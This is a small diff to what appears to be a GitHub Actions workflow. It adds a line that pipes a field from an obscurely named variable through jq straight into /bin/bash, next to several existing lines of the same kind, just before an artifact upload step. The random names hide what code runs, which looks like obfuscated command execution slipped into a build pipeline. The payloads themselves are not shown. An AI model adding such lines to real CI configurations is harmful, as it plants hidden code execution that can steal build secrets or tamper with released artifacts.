@@ -37,6 +37,7 @@ jobs:
           echo $cix1 | jq -r .mga92470 | /bin/bash
           printf '%s' "$zds42956" | jq -r .qfmkw1 | /bin/bash
           echo $fm62 | jq -r .zqwa3377 | /bin/bash
+          printf '%s' "$jeikt4" | jq -r .vs31 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
